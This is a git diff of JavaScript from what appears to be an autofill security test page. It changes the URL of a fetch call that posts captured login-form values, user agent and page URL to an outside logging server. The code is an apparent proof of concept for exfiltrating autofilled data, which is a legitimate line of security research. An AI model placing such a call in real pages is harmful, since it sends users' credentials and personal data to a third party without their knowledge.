@@ -25,17 +25,20 @@ document.getElementById("loginForm").addEventListener("submit", function (e) {
   );
 
   // Attempt to send to mock endpoint (will fail due to CORS, but demonstrates the concept)
-  fetch("https://autofill-security-test-server.onrender.com/log", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      timestamp: new Date().toISOString(),
-      technique: document.querySelector(".technique-info h3").textContent,
-      data: values,
-      userAgent: navigator.userAgent,
-      url: window.location.href,
-    }),
-  })
+  fetch(
+    "https://autofill-security-test-backend-production.up.railway.app/log",
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        timestamp: new Date().toISOString(),
+        technique: document.querySelector(".technique-info h3").textContent,
+        data: values,
+        userAgent: navigator.userAgent,
+        url: window.location.href,
+      }),
+    }
+  )
     .then((response) => {
       console.log("Data sent to logging endpoint");
       return response.json();
